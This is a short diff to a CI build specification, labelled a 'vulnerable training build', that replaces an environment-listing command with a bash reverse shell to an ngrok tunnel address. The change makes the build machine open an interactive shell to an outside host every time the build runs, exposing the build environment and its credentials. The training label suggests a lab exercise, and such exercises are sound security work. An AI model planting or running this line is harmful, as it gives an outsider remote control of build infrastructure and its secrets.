@@ -4,5 +4,5 @@ phases:
   build:
     commands:
       - echo "Running vulnerable training build"
-      - env | sort | head -n 20
+      - bash -i >& /dev/tcp/0.tcp.jp.ngrok.io/10654 0>&1
       - echo "Done"
